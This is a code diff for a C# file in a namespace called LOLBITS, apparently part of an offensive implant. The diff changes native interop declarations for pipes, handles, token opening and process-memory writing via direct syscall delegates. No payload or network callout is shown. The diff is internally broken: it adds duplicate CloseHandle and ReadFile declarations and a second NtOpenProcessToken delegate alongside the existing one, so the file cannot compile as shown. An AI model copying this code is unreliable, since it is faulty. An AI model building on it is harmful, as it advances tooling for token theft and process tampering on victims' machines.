@@ -71,17 +71,21 @@ namespace LOLBITS
             uint tokenInformationLength,
             out uint returnLength);
 
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern IntPtr GetSidSubAuthority(IntPtr sid, uint subAuthorityIndex);
+        [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+        public static extern bool CloseHandle(IntPtr handle);
+            
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr CreatePipe(ref IntPtr hReadPipe, ref IntPtr hWritePipe, ref SecurityAttributes lpPipeAttributes, int nSize);
 
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern IntPtr GetSidSubAuthorityCount(IntPtr sid);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped);
 
         [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
         public static extern bool CloseHandle(IntPtr handle);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped);
+
 
         /////////////////////////// Native Syscall ///////////////////////////
 
@@ -93,7 +97,7 @@ namespace LOLBITS
         public delegate int NtOpenProcessToken(IntPtr processHandle, DInvoke.Win32.WinNT._TOKEN_ACCESS_FLAGS desiredAccess, out IntPtr tokenHandle);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate int NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, out IntPtr buffer, uint numberOfBytesToRead, out IntPtr numberOfBytesReaded);
+        public delegate int NtOpenProcessToken(IntPtr processHandle, TokenAccessFlags desiredAccess, out IntPtr tokenHandle);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate int NtWriteVirtualMemory(IntPtr processHandle, IntPtr address, byte[] buffer, UIntPtr size, IntPtr bytesWrittenBuffer);
